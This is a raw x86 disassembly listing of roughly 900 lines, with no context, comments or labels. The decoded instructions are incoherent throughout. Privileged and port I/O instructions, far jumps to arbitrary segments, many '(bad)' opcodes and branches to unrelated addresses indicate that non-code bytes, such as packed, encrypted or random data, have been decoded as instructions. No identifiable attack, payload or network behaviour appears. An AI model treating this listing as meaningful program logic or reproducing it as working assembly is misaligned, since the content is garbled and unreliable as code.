  41dac3:	mov    esi,0xb5db1e39
  41dac8:	adc    eax,0x20da503c
  41dacd:	aam    0x27
  41dacf:	adc    bh,0x4b
  41dad2:	xchg   BYTE PTR [esi+0x54],ah
  41dad5:	jmp    0x41db51
  41dad7:	add    esi,DWORD PTR [ecx]
  41dad9:	xor    dh,BYTE PTR [eax]
  41dadb:	shl    DWORD PTR [ebx-0x24462cfa],0x8f
  41dae2:	jge    0x41dacf
  41dae4:	aaa    
  41dae5:	mov    ds:0x473254f1,eax
  41daea:	je     0x41da7f
  41daec:	call   0x4513:0x272b4061
  41daf3:	jnp    0x41db07
  41daf5:	iret   
  41daf6:	jmp    0x1b26:0x7a08b250
  41dafd:	aaa    
  41dafe:	and    ch,BYTE PTR [eax]
  41db00:	xchg   edx,eax
  41db01:	(bad)  
  41db02:	call   FWORD PTR [esi]
  41db04:	sub    eax,0x33e820b7
  41db09:	mov    ecx,0x68d6ee7
  41db0e:	push   ecx
  41db0f:	cdq    
  41db10:	retf   0x8767
  41db13:	in     al,0xfa
  41db15:	rol    DWORD PTR [edx+0x45],0x4f
  41db19:	std    
  41db1a:	add    ebp,DWORD PTR [ecx+0x65]
  41db1d:	fmul   QWORD PTR [edx-0x74]
  41db20:	cli    
  41db21:	jge    0x41dab7
  41db23:	xchg   esp,eax
  41db24:	inc    eax
  41db25:	cmp    al,0xe9
  41db27:	outs   dx,DWORD PTR ds:[esi]
  41db28:	fadd   QWORD PTR [ebp+eiz*2+0x1bdb3bc7]
  41db2f:	sub    dl,bh
  41db31:	push   ebp
  41db32:	adc    bh,dl
  41db34:	fcmovnbe st,st(2)
  41db36:	mov    ebx,0x370af9c9
  41db3b:	push   ds
  41db3c:	addr16 test eax,0x45527e2
  41db42:	test   BYTE PTR [edi],bl
  41db44:	pushf  
  41db45:	xor    DWORD PTR [edx+0x65],ecx
  41db48:	fsub   DWORD PTR [ecx-0x3]
  41db4b:	inc    edi
  41db4c:	dec    edi
  41db4d:	push   cs
  41db4e:	icebp  
  41db4f:	dec    ecx
  41db50:	adc    esp,DWORD PTR [edi-0x57]
  41db53:	pop    eax
  41db54:	sbb    esi,DWORD PTR ss:[esp+eiz*4+0x54e9a415]
  41db5c:	jns    0x41db5e
  41db5e:	mov    ebx,0x3fb1491d
  41db63:	outs   dx,BYTE PTR ds:[esi]
  41db64:	(bad)  
  41db65:	js     0x41db02
  41db67:	arpl   WORD PTR [ecx+ebx*2+0x5af271c5],cx
  41db6e:	outs   dx,DWORD PTR ds:[esi]
  41db6f:	sbb    bh,BYTE PTR [eax]
  41db71:	mov    dl,0x49
  41db73:	outs   dx,BYTE PTR ds:[esi]
  41db74:	std    
  41db75:	stos   DWORD PTR es:[edi],eax
  41db76:	out    0x7c,eax
  41db78:	sbb    al,0x3c
  41db7a:	xor    ebp,ecx
  41db7c:	jns    0x41db65
  41db7e:	call   0xf135ac3a
  41db83:	ins    DWORD PTR es:[edi],dx
  41db84:	in     al,0xbc
  41db86:	rol    BYTE PTR [ebx-0x5b],1
  41db89:	fisubr WORD PTR [eax-0x6203c66a]
  41db8f:	lock lea ebx,[edx-0xe]
  41db93:	xor    eax,0xa8ddaefb
  41db98:	sahf   
  41db99:	and    BYTE PTR ds:[edi-0x6c],cl
  41db9d:	fs or  al,0x39
  41dba0:	mov    edx,0xb2233a7e
  41dba5:	cmp    al,0xc0
  41dba7:	xchg   esi,eax
  41dba8:	(bad)  
  41dba9:	imul   esi,DWORD PTR [eax+0x61],0xf2845240
  41dbb0:	repnz stos DWORD PTR es:[edi],eax
  41dbb2:	mov    ebx,DWORD PTR [ebx+0x1f]
  41dbb5:	dec    eax
  41dbb6:	aas    
  41dbb7:	in     al,dx
  41dbb8:	add    al,0x83
  41dbba:	push   di
  41dbbc:	aad    0x6
  41dbbe:	jmp    0xb4f162ba
  41dbc3:	fisub  DWORD PTR cs:[edx-0x3f]
  41dbc7:	push   edi
  41dbc8:	push   0x27
  41dbca:	lea    esi,[edx+eax*2+0x34]
  41dbce:	sbb    edx,DWORD PTR [edi]
  41dbd0:	not    BYTE PTR [edx]
  41dbd2:	xchg   esp,eax
  41dbd3:	aas    
  41dbd4:	test   DWORD PTR [ebx],ecx
  41dbd6:	adc    ch,BYTE PTR [eax-0x2fb3255]
  41dbdc:	xlat   BYTE PTR ds:[ebx]
  41dbdd:	stos   BYTE PTR es:[edi],al
  41dbde:	cmp    al,ch
  41dbe0:	sti    
  41dbe1:	inc    ecx
  41dbe2:	mov    edx,0x70a10fc7
  41dbe7:	push   edx
  41dbe8:	inc    edi
  41dbe9:	jmp    0x41db6b
  41dbeb:	adc    eax,0xe7d82cb7
  41dbf0:	inc    ebp
  41dbf1:	sbb    BYTE PTR [edx+0x63687fa7],dl
  41dbf7:	inc    edx
  41dbf8:	mov    ds:0xbc105744,al
  41dbfd:	popa   
  41dbfe:	or     esp,eax
  41dc00:	in     al,dx
  41dc01:	add    eax,0x25d9aac6
  41dc06:	or     al,0x80
  41dc08:	or     al,dl
  41dc0a:	fwait
  41dc0b:	mov    bh,al
  41dc0d:	scas   eax,DWORD PTR es:[edi]
  41dc0e:	inc    ebp
  41dc0f:	fcmovnb st,st(7)
  41dc11:	jp     0x41dbe7
  41dc13:	mov    WORD PTR [edi-0x4c056a20],?
  41dc19:	shl    DWORD PTR [eax+edi*2-0x57f8a1c0],1
  41dc20:	push   es
  41dc21:	ds push ebp
  41dc23:	lods   eax,DWORD PTR ds:[esi]
  41dc24:	ror    eax,0x7f
  41dc27:	inc    esp
  41dc28:	xor    BYTE PTR cs:[edx+0x40],ah
  41dc2c:	out    dx,eax
  41dc2d:	xchg   edi,eax
  41dc2e:	in     al,0xb1
  41dc30:	xchg   BYTE PTR [edi+eax*8],ch
  41dc33:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41dc35:	pop    ds
  41dc36:	js     0x41dbf4
  41dc38:	cmp    eax,DWORD PTR [edi-0x2]
  41dc3b:	test   dl,cl
  41dc3d:	cmp    bl,BYTE PTR [esi+0x7d86192]
  41dc43:	mov    al,ds:0xb92d8acc
  41dc48:	xchg   esi,eax
  41dc49:	(bad)  
  41dc4c:	pop    ds
  41dc4d:	sub    dh,al
  41dc4f:	add    ebp,ecx
  41dc51:	dec    eax
  41dc52:	xchg   al,dh
  41dc54:	jmp    0x1484:0x888e
  41dc5a:	je     0x41dc71
  41dc5c:	and    dl,BYTE PTR [ecx]
  41dc5e:	dec    ecx
  41dc5f:	ret    
  41dc60:	xor    ebp,DWORD PTR [edx-0xc]
  41dc63:	push   eax
  41dc64:	test   eax,0x4ff3bd27
  41dc69:	and    BYTE PTR [ecx-0x7c],0xfe
  41dc6d:	mov    ch,0xa7
  41dc6f:	xchg   esi,eax
  41dc70:	sub    al,0xd1
  41dc72:	popf   
  41dc73:	test   DWORD PTR [esi+0x34],0x6b7b513a
  41dc7a:	push   cs
  41dc7b:	push   ebp
  41dc7c:	mov    ds:0xe76f931,al
  41dc81:	out    dx,al
  41dc82:	rcr    DWORD PTR [ebx-0x7215cdd0],1
  41dc88:	shl    al,cl
  41dc8a:	sti    
  41dc8b:	dec    ebp
  41dc8c:	leave  
  41dc8d:	ret    0x6bdb
  41dc90:	fcomp  DWORD PTR [eax-0x13d95ec6]
  41dc96:	mov    esi,edx
  41dc98:	and    eax,0x8726e897
  41dc9d:	in     al,0x5e
  41dc9f:	inc    ebx
  41dca0:	out    dx,eax
  41dca1:	daa    
  41dca2:	or     eax,0x39ab1d6d
  41dca7:	nop
  41dca8:	mov    ecx,0xd37034f7
  41dcad:	push   eax
  41dcae:	pop    ebx
  41dcaf:	aas    
  41dcb0:	fs int 0x9f
  41dcb3:	pop    ecx
  41dcb4:	mov    ds:0x4a7f28e6,eax
  41dcb9:	cwde   
  41dcba:	(bad)  
  41dcbb:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41dcbd:	jge    0x41dce0
  41dcbf:	xchg   esi,eax
  41dcc0:	and    bl,BYTE PTR es:[ecx]
  41dcc3:	xchg   esi,eax
  41dcc4:	or     DWORD PTR [edi-0x5d53d60c],esp
  41dcca:	shr    BYTE PTR [esp+edx*2],0x4b
  41dcce:	jns    0x41dcea
  41dcd0:	es push esi
  41dcd2:	sbb    edx,ebp
  41dcd4:	pop    edx
  41dcd5:	sbb    ah,BYTE PTR [edi]
  41dcd7:	xchg   ebp,eax
  41dcd8:	xchg   ebp,eax
  41dcd9:	outs   dx,DWORD PTR ds:[esi]
  41dcda:	psadbw mm1,QWORD PTR [ebx-0x2074f7ca]
  41dce1:	push   es
  41dce2:	dec    edi
  41dce3:	mov    ah,0xad
  41dce5:	repz sbb BYTE PTR [edi],cl
  41dce8:	xor    DWORD PTR ds:0x9ff4f8ad,ebx
  41dcee:	jno    0x41dd3f
  41dcf0:	aad    0x10
  41dcf2:	jge    0x41dcb6
  41dcf4:	enter  0x67c1,0xb4
  41dcf8:	fnstcw WORD PTR [edi-0x7a93ce13]
  41dcfe:	rol    BYTE PTR [ebp+0x59],0xa4
  41dd02:	aam    0xe5
  41dd04:	adc    DWORD PTR [edi-0x5eece824],edi
  41dd0a:	sbb    edi,0xa8adf2c2
  41dd10:	push   0x7d
  41dd12:	pop    ss
  41dd13:	mov    cl,0xfa
  41dd15:	xchg   DWORD PTR [edi],ebx
  41dd17:	dec    esi
  41dd18:	mov    fs,WORD PTR [ecx]
  41dd1a:	jno    0x41dd6d
  41dd1c:	(bad)  
  41dd1e:	repnz sbb al,0x7d
  41dd21:	shr    DWORD PTR [ebp+eiz*2-0x4d35120c],cl
  41dd28:	pop    ss
  41dd29:	pushf  
  41dd2a:	setl   BYTE PTR [ecx-0x572acc6f]
  41dd31:	inc    ecx
  41dd32:	bound  edx,QWORD PTR [ebp+0x4a]
  41dd35:	pop    ds
  41dd36:	pop    edx
  41dd37:	fldcw  WORD PTR [ecx]
  41dd39:	std    
  41dd3a:	pop    edi
  41dd3b:	cwde   
  41dd3c:	xlat   BYTE PTR ds:[ebx]
  41dd3d:	cmp    DWORD PTR [edx],eax
  41dd3f:	addr16 inc ecx
  41dd41:	jne    0x41dd8c
  41dd43:	or     ch,BYTE PTR [ecx-0x42]
  41dd46:	push   eax
  41dd47:	mov    eax,ds:0x6a94179d
  41dd4c:	xor    esp,DWORD PTR [ecx-0x41]
  41dd4f:	(bad)  
  41dd50:	in     eax,0xf3
  41dd52:	and    al,0x50
  41dd54:	pop    esp
  41dd55:	mov    bl,bh
  41dd57:	sahf   
  41dd58:	lods   al,BYTE PTR ds:[esi]
  41dd59:	xchg   DWORD PTR [ecx+0x2854a10e],edx
  41dd5f:	push   0xffffffeb
  41dd61:	adc    esp,DWORD PTR [ebp-0x44fced82]
  41dd67:	leave  
  41dd68:	shr    ecx,0xe1
  41dd6b:	mov    ebp,0x8b7c1387
  41dd70:	xchg   edx,eax
  41dd71:	fcom   st(1)
  41dd73:	scas   eax,DWORD PTR es:[edi]
  41dd74:	test   dh,dh
  41dd76:	repnz mov esi,0x20cd1100
  41dd7c:	std    
  41dd7d:	in     eax,0x23
  41dd7f:	push   ecx
  41dd80:	jmp    0x8771:0xb4e459a7
  41dd87:	mov    ss,ecx
  41dd89:	iret   
  41dd8a:	retf   
  41dd8b:	sar    dh,cl
  41dd8d:	ja     0x41dd5a
  41dd8f:	lods   al,BYTE PTR ds:[esi]
  41dd90:	sbb    DWORD PTR [esi],ebp
  41dd92:	shl    BYTE PTR [edx-0x7b44c7b2],0xbd
  41dd99:	mov    ss,WORD PTR [esi-0x199d3030]
  41dd9f:	mov    ch,0x32
  41dda1:	cmp    BYTE PTR [esi+0x15],0x47
  41dda5:	adc    BYTE PTR [ecx-0x39],0xd5
  41dda9:	mov    ds:0x459a2fce,al
  41ddae:	xor    ch,BYTE PTR ds:0xb9f8ef91
  41ddb4:	mov    ecx,0xac445f9a
  41ddb9:	fstp   QWORD PTR [edx+0x46f0d690]
  41ddc0:	icebp  
  41ddc1:	cli    
  41ddc2:	pop    ds
  41ddc3:	lods   al,BYTE PTR ds:[esi]
  41ddc4:	push   0xffffff99
  41ddc6:	jnp    0x41ddb8
  41ddc8:	jg     0x41dd95
  41ddca:	add    DWORD PTR [esi],eax
  41ddcc:	fmul   st,st(0)
  41ddce:	icebp  
  41ddcf:	rcr    DWORD PTR [ebx+0x59ec3c67],0xc5
  41ddd6:	and    BYTE PTR [ebx],0x57
  41ddd9:	inc    ebp
  41ddda:	es sbb eax,0x5ab5d3b5
  41dde0:	and    DWORD PTR [ebp+esi*2+0x6c],ebx
  41dde4:	popf   
  41dde5:	dec    eax
  41dde6:	arpl   WORD PTR [ecx-0x59],dx
  41dde9:	(bad)  
  41ddea:	sub    ch,BYTE PTR [esp+ebp*1+0x63]
  41ddee:	fbld   TBYTE PTR [ebx+0x66]
  41ddf1:	arpl   WORD PTR [eax+0x4c],bx
  41ddf4:	sbb    DWORD PTR [eax],0xfffffff0
  41ddf7:	cmp    cl,BYTE PTR [edi-0x7efdbb2]
  41ddfd:	adc    ebx,DWORD PTR [esp+eax*2-0x5d]
  41de01:	stos   BYTE PTR es:[edi],al
  41de02:	xchg   ebx,eax
  41de03:	in     eax,0x12
  41de05:	sub    DWORD PTR [ebp+0x6c],ebx
  41de08:	mov    ch,0xe1
  41de0a:	cld    
  41de0b:	sub    BYTE PTR [esi+0x66c0e822],al
  41de11:	xor    edx,eax
  41de13:	dec    ecx
  41de14:	sbb    BYTE PTR [ecx+edx*2],dh
  41de17:	or     ah,cl
  41de19:	sbb    bl,BYTE PTR [edi-0x6ed3a68d]
  41de1f:	fucomip st,st(0)
  41de21:	jp     0x41de1e
  41de23:	out    0xfe,al
  41de25:	inc    edx
  41de26:	or     eax,0xb828ef7e
  41de2b:	fmul   DWORD PTR [eax+eax*8]
  41de2e:	sub    edx,DWORD PTR [eax+ebx*8-0x745cd247]
  41de35:	loop   0x41de6b
  41de37:	sub    dh,BYTE PTR fs:[ebx-0x2232cdc9]
  41de3e:	dec    eax
  41de3f:	loope  0x41de10
  41de41:	shl    BYTE PTR [ebp-0x75883349],1
  41de47:	xor    al,0xdc
  41de49:	sar    DWORD PTR [edi],1
  41de4b:	inc    esp
  41de4c:	dec    ebx
  41de4d:	retf   0x84b4
  41de50:	adc    DWORD PTR [edi+0xdb66e2f],esi
  41de56:	xor    al,0xae
  41de58:	mov    DWORD PTR [ebx-0x2153f50f],ebp
  41de5e:	adc    DWORD PTR [edi+0x4bdd27a2],ebp
  41de64:	mov    esi,0xc65e5c94
  41de69:	or     DWORD PTR [eax-0x526a5798],ebp
  41de6f:	or     bh,dh
  41de71:	pop    ds
  41de72:	(bad)  
  41de73:	lds    eax,FWORD PTR [ecx]
  41de75:	push   edx
  41de76:	sub    eax,0x7342ad07
  41de7b:	dec    eax
  41de7c:	scas   al,BYTE PTR es:[edi]
  41de7d:	xor    BYTE PTR [edi],al
  41de7f:	loopne 0x41dec9
  41de81:	jp     0x41de6e
  41de83:	test   al,0xb7
  41de86:	push   es
  41de87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de88:	push   DWORD PTR [ebx]
  41de8a:	add    al,0x9e
  41de8c:	adc    ebp,DWORD PTR [esi+0x66]
  41de8f:	out    0x45,al
  41de91:	ret    
  41de92:	jl     0x41de15
  41de94:	pushf  
  41de95:	psllq  mm5,QWORD PTR [esi]
  41de98:	or     bh,bh
  41de9a:	aaa    
  41de9b:	xchg   ebp,eax
  41de9c:	dec    edx
  41de9d:	adc    dl,BYTE PTR [eax-0x5716ae97]
  41dea3:	repnz mov ch,0xe2
  41dea6:	fdiv   QWORD PTR [edi+0x533c4baf]
  41deac:	shr    ah,1
  41deae:	and    BYTE PTR [edx-0x3f0178fa],dl
  41deb4:	pushf  
  41deb5:	sahf   
  41deb6:	fcom   DWORD PTR [edi]
  41deb8:	scas   al,BYTE PTR es:[edi]
  41deb9:	dec    ecx
  41deba:	in     eax,dx
  41debb:	adc    eax,0xc6fcb93a
  41dec0:	test   DWORD PTR [ecx-0x462ed669],0x32d224fd
  41deca:	xchg   edx,eax
  41decb:	call   0xebdb:0x2d7ce19e
  41ded2:	or     eax,0xffffffaa
  41ded5:	test   eax,0xc3e161be
  41deda:	xchg   DWORD PTR [ebx+eiz*8],edx
  41dedd:	(bad)  
  41dedf:	sbb    ah,BYTE PTR [ebx]
  41dee1:	ins    BYTE PTR es:[edi],dx
  41dee2:	xchg   BYTE PTR [ebp-0x6e],dh
  41dee5:	pusha  
  41dee6:	push   ds
  41dee7:	mov    esi,es
  41dee9:	xchg   DWORD PTR [ebp+0x28cbcb9f],esi
  41deef:	adc    eax,0xa96a52ff
  41def4:	mov    ecx,0x25ced62c
  41def9:	and    al,0x95
  41defb:	aas    
  41defc:	or     ecx,ebx
  41defe:	je     0x41df09
  41df00:	push   edx
  41df01:	inc    eax
  41df02:	sub    cl,BYTE PTR [ebp+0xbff39a3]
  41df08:	xchg   ecx,eax
  41df09:	aas    
  41df0a:	cs aaa 
  41df0c:	(bad)  
  41df0d:	aad    0xce
  41df0f:	xchg   ebp,eax
  41df10:	xchg   ebx,eax
  41df11:	je     0x41de9b
  41df13:	or     DWORD PTR [eax-0x58be4102],edi
  41df19:	jno    0x41df33
  41df1b:	inc    ebx
  41df1c:	lock cmp DWORD PTR [ecx-0x5],esp
  41df20:	stos   DWORD PTR es:[edi],eax
  41df21:	stos   DWORD PTR es:[edi],eax
  41df22:	and    BYTE PTR [ecx],0xba
  41df25:	push   0xffffffb3
  41df27:	lock mov bh,0xa4
  41df2a:	lock inc edi
  41df2c:	push   0xffffffb9
  41df2e:	adc    eax,0xfacd20f9
  41df33:	jmp    0x41def5
  41df35:	bound  edi,QWORD PTR [eax+0x7]
  41df38:	mov    esi,0xcf22a3ce
  41df3d:	imul   ebx,DWORD PTR [esi],0xffffff80
  41df40:	cs sub ch,dh
  41df43:	test   eax,0x31b98958
  41df48:	sbb    ah,BYTE PTR [edi]
  41df4a:	int3   
  41df4b:	enter  0x1a26,0x67
  41df4f:	adc    eax,0xba514b80
  41df54:	data16 int3 
  41df56:	jg     0x41deda
  41df58:	dec    esi
  41df59:	mov    dh,0xbf
  41df5b:	loop   0x41df0c
  41df5d:	stc    
  41df5e:	jnp    0x41df29
  41df60:	inc    DWORD PTR [ecx-0x1c]
  41df63:	sub    dh,bh
  41df65:	xchg   edi,eax
  41df66:	aas    
  41df67:	xor    BYTE PTR [esi],0x9b
  41df6a:	jg     0x41def7
  41df6c:	adc    DWORD PTR [ebx],edx
  41df6e:	or     al,0x72
  41df70:	jecxz  0x41dfd8
  41df72:	inc    ebx
  41df73:	push   esi
  41df74:	mov    esp,DWORD PTR [ecx+0x136811f3]
  41df7a:	sbb    bh,cl
  41df7c:	push   ecx
  41df7d:	ins    DWORD PTR es:[edi],dx
  41df7e:	push   ecx
  41df7f:	std    
  41df80:	arpl   WORD PTR [ecx],bx
  41df82:	mov    edi,0x802caa6d
  41df87:	retf   0xca22
  41df8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df8b:	mov    cl,0xa6
  41df8d:	dec    eax
  41df8e:	rcl    DWORD PTR [ebx+esi*4],1
  41df91:	push   edx
  41df92:	shl    DWORD PTR [eax-0x4f],cl
  41df95:	jl     0x41df1c
  41df97:	lods   al,BYTE PTR ds:[esi]
  41df98:	jae    0x41df1f
  41df9a:	test   al,0x90
  41df9c:	sub    DWORD PTR [edi+edx*8],edi
  41df9f:	inc    edi
  41dfa0:	sub    bl,BYTE PTR [esp+eax*8-0x73]
  41dfa4:	in     al,0x51
  41dfa6:	add    esp,DWORD PTR [ebp+0x44]
  41dfa9:	sbb    ecx,DWORD PTR [edx-0x20]
  41dfac:	push   ebp
  41dfad:	mov    ch,0x5b
  41dfaf:	lahf   
  41dfb0:	xchg   ebp,eax
  41dfb1:	sbb    BYTE PTR [ecx],ch
  41dfb3:	push   ebx
  41dfb4:	hlt    
  41dfb5:	adc    DWORD PTR [edx+0x28690463],esi
  41dfbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfbc:	sub    BYTE PTR [edi+0x2b],0xe6
  41dfc0:	sub    eax,0xb1ffd6b1
  41dfc5:	cmp    cl,ch
  41dfc7:	xchg   esi,eax
  41dfc8:	psubd  mm0,mm1
  41dfcb:	inc    ebp
  41dfcc:	xchg   esi,eax
  41dfcd:	lds    esi,FWORD PTR ss:0x2382dd6e
  41dfd4:	mov    eax,ds:0xa19626f4
  41dfd9:	cld    
  41dfda:	sub    BYTE PTR [edx-0x572d635d],bh
  41dfe0:	xchg   edx,eax
  41dfe1:	push   ebx
  41dfe2:	aaa    
  41dfe3:	jmp    0x41df88
  41dfe5:	xchg   BYTE PTR [ecx-0x31],dl
  41dfe8:	cmc    
  41dfe9:	xchg   ecx,eax
  41dfea:	and    ecx,DWORD PTR [edx-0x19]
  41dfed:	iret   
  41dfee:	test   BYTE PTR [ebp+0x2c44f61d],bh
  41dff4:	daa    
  41dff5:	and    DWORD PTR [esi-0x5b88fe8f],edi
  41dffb:	jmp    0x41dfca
  41dffd:	push   ecx
  41dffe:	sar    ebx,cl
  41e000:	xchg   ebp,eax
  41e001:	cmp    al,0xa7
  41e003:	sbb    edi,ebp
  41e005:	push   edi
  41e006:	fld    DWORD PTR [edi+0x20]
  41e009:	in     al,0x8b
  41e00b:	push   0x566eb0b8
  41e010:	ret    0x520
  41e013:	fnsave [ebp+0x3287ef44]
  41e019:	xchg   ecx,eax
  41e01a:	xchg   ebp,eax
  41e01b:	cmc    
  41e01c:	test   eax,0xd0eb5207
  41e021:	in     eax,0xd1
  41e023:	dec    esp
  41e024:	stos   BYTE PTR es:[edi],al
  41e025:	ror    DWORD PTR [edx+0x39ee9475],cl
  41e02b:	inc    eax
  41e02c:	sbb    ebx,DWORD PTR [edx+0x7e]
  41e02f:	int3   
  41e030:	ins    BYTE PTR es:[edi],dx
  41e031:	push   ss
  41e032:	jp     0x41dfbb
  41e034:	add    ecx,DWORD PTR [edi-0xf570389]
  41e03a:	adc    al,0xde
  41e03c:	les    edi,FWORD PTR [eax-0x481d6a8b]
  41e042:	sbb    eax,0x73352b33
  41e047:	mov    edi,0xccafe4a9
  41e04c:	pushw  ss
  41e04e:	out    0x95,al
  41e050:	int    0x91
  41e052:	mov    dl,0xc9
  41e054:	sti    
  41e055:	popf   
  41e056:	mov    esi,0x58e2e807
  41e05b:	mov    al,0xd7
  41e05d:	fist   DWORD PTR [ebx+0x7b]
  41e060:	inc    esi
  41e061:	addr16 mov ebx,0xbcf7985e
  41e068:	stos   BYTE PTR es:[edi],al
  41e069:	mov    BYTE PTR [esi-0x1494dfe7],bl
  41e06f:	(bad)  
  41e070:	mov    bh,0x38
  41e072:	sub    al,BYTE PTR [ecx-0x442c4422]
  41e078:	jnp    0x41e02e
  41e07a:	pop    esp
  41e07b:	mov    edx,DWORD PTR [eax-0x38dc8247]
  41e081:	jl     0x41e058
  41e083:	out    dx,al
  41e084:	push   0x3c
  41e086:	ins    BYTE PTR es:[edi],dx
  41e087:	nop
  41e088:	fild   QWORD PTR [eax+ebp*8-0x2]
  41e08c:	arpl   WORD PTR [eax],sp
  41e08e:	iret   
  41e08f:	loopne 0x41e036
  41e091:	outs   dx,DWORD PTR ds:[esi]
  41e092:	and    DWORD PTR [ecx+0x6b8a7ddf],esp
  41e098:	cmp    BYTE PTR [eax+0x754eac54],bh
  41e09e:	push   0xf7229793
  41e0a3:	sbb    al,0x93
  41e0a5:	fldcw  WORD PTR [ebp-0x7ca4d5b5]
  41e0ab:	inc    ecx
  41e0ac:	mov    cl,0xc9
  41e0ae:	dec    DWORD PTR [edx]
  41e0b0:	js     0x41e040
  41e0b2:	jp     0x41e12b
  41e0b4:	daa    
  41e0b5:	test   DWORD PTR [ebx+0x150c1aa2],esp
  41e0bb:	call   0x833f2469
  41e0c0:	add    ch,BYTE PTR [esi+0x63]
  41e0c3:	xchg   ecx,eax
  41e0c4:	pop    es
  41e0c5:	add    ch,BYTE PTR [edi]
  41e0c7:	daa    
  41e0c8:	ss enter 0xdfea,0x9a
  41e0cd:	es xor eax,0x96445ae
  41e0d3:	push   ebp
  41e0d4:	jnp    0x41e0d8
  41e0d6:	sub    eax,0xfc3b0461
  41e0db:	data16 cmp dl,cl
  41e0de:	aas    
  41e0df:	cmp    eax,0x6117b47
  41e0e4:	popf   
  41e0e5:	sbb    BYTE PTR [eax],dl
  41e0e7:	lock es sub eax,0xdb5182c7
  41e0ee:	xor    al,0x32
  41e0f0:	mov    esi,ecx
  41e0f2:	clc    
  41e0f3:	pop    ds
  41e0f4:	push   esi
  41e0f5:	mov    cl,0xf5
  41e0f7:	sub    DWORD PTR [edi+0x8],esi
  41e0fa:	pop    ebp
  41e0fb:	stos   DWORD PTR es:[edi],eax
  41e0fc:	lea    edi,[ebp-0x5d310a]
  41e102:	jnp    0x41e0b1
  41e104:	jmp    0xb822b9ae
  41e109:	test   al,0x6d
  41e10b:	out    0x38,al
  41e10d:	push   ebp
  41e10e:	jg     0x41e134
  41e110:	mov    eax,0x6824433f
  41e115:	dec    edi
  41e116:	mov    ds:0xeab8f505,eax
  41e11b:	in     eax,dx
  41e11c:	test   ebx,esp
  41e11e:	mov    ah,0xd2
  41e120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e121:	stc    
  41e122:	push   esp
  41e123:	(bad)  
  41e124:	fwait
  41e125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e126:	(bad)  
  41e127:	jmp    0x2c75f143
  41e12c:	adc    al,0xa3
  41e12e:	outs   dx,DWORD PTR ds:[esi]
  41e12f:	jb     0x41e175
  41e131:	pop    eax
  41e132:	ins    BYTE PTR es:[edi],dx
  41e133:	jo     0x41e0f8
  41e135:	lock mov bh,0x60
  41e138:	pop    ds
  41e139:	gs or  al,0x64
  41e13c:	mov    dh,0x36
  41e13e:	popf   
  41e13f:	mov    bl,0x1f
  41e141:	mov    ebp,0xb0128f54
  41e146:	retf   0x7c32
  41e149:	(bad)  [esi]
  41e14b:	pinsrw mm4,WORD PTR [eax],0x36
  41e14f:	jns    0x41e125
  41e151:	mov    esp,0xec9a34c4
  41e156:	pop    ebx
  41e157:	mov    cl,0xf2
  41e159:	std    
  41e15a:	jbe    0x41e13e
  41e15c:	xor    al,0x73
  41e15e:	pop    edi
  41e15f:	push   edi
  41e160:	mov    dl,BYTE PTR [edx]
  41e162:	outs   dx,BYTE PTR ds:[esi]
  41e163:	pmuludq mm1,QWORD PTR [edx]
  41e166:	jnp    0x41e158
  41e168:	aad    0x79
  41e16a:	mov    eax,ds:0x6ab16e1d
  41e16f:	xor    DWORD PTR [esi-0x6ec31697],esi
  41e175:	out    0xff,al
  41e177:	or     eax,0x84b959d7
  41e17c:	nop
  41e17d:	sahf   
  41e17e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e17f:	jl     0x41e1fe
  41e181:	fs cli 
  41e183:	(bad)  
  41e184:	pushf  
  41e185:	stc    
  41e186:	xchg   ebp,eax
  41e187:	or     eax,0x7b5fb8ac
  41e18c:	in     eax,0xc1
  41e18e:	(bad)  
  41e18f:	lods   eax,DWORD PTR ds:[esi]
  41e190:	cmp    esi,edx
  41e192:	jbe    0x41e11d
  41e194:	data16 aad 0x34
  41e197:	sub    al,0x7e
  41e199:	mov    esp,0xd4678226
  41e19e:	test   BYTE PTR [esi],dl
  41e1a0:	adc    DWORD PTR [esi+0x3135a19b],edx
  41e1a6:	jnp    0x41e146
  41e1a8:	dec    ecx
  41e1a9:	add    eax,0xe3ecfa78
  41e1ae:	cdq    
  41e1af:	int3   
  41e1b0:	in     eax,0xc1
  41e1b2:	fnstenv [edi+0x8]
  41e1b5:	rol    BYTE PTR [ebx],0xec
  41e1b8:	dec    ebx
  41e1b9:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1bb:	adc    DWORD PTR [ecx],ecx
  41e1bd:	inc    ebx
  41e1be:	jg     0x41e233
  41e1c0:	enter  0xdf7e,0x25
  41e1c4:	int    0xd3
  41e1c6:	jmp    0xfe545957
  41e1cb:	hlt    
  41e1cc:	not    DWORD PTR [esi-0x4055463f]
  41e1d2:	std    
  41e1d3:	inc    esp
  41e1d4:	hlt    
  41e1d5:	mov    DWORD PTR [esi+0x6072b414],esp
  41e1db:	loope  0x41e230
  41e1dd:	jb     0x41e25d
  41e1df:	shr    DWORD PTR [ebp+0x10ab7cee],cl
  41e1e5:	inc    esp
  41e1e6:	mov    al,ds:0x25fc6754
  41e1eb:	ja     0x41e1cf
  41e1ed:	cld    
  41e1ee:	dec    ecx
  41e1ef:	(bad)  
  41e1f1:	loop   0x41e1c1
  41e1f3:	in     al,dx
  41e1f4:	mov    ch,0x78
  41e1f6:	push   ebx
  41e1f7:	dec    esi
  41e1f8:	mov    eax,0x55ca2592
  41e1fd:	out    0x18,al
  41e1ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e200:	inc    ebx
  41e201:	adc    DWORD PTR [esi],0x5ebf6c39
  41e207:	fwait
  41e208:	jae    0x41e260
  41e20a:	jl     0x41e1e1
  41e20c:	sub    DWORD PTR [edi+0x470dba27],esp
  41e212:	pop    ax
  41e214:	es loope 0x41e1d3
  41e217:	rol    BYTE PTR ds:0xcd590c34,cl
  41e21d:	xor    DWORD PTR [ecx+0x40b2d43a],esi
  41e223:	mov    esp,0x58c7d9f6
  41e228:	lahf   
  41e229:	pusha  
  41e22a:	pop    eax
  41e22b:	scas   eax,DWORD PTR es:[edi]
  41e22c:	fld    TBYTE PTR [edi+edx*1+0x45843d55]
  41e233:	push   0xd05575e6
  41e238:	das    
  41e239:	pop    ebp
  41e23a:	jmp    0x8d53faf7
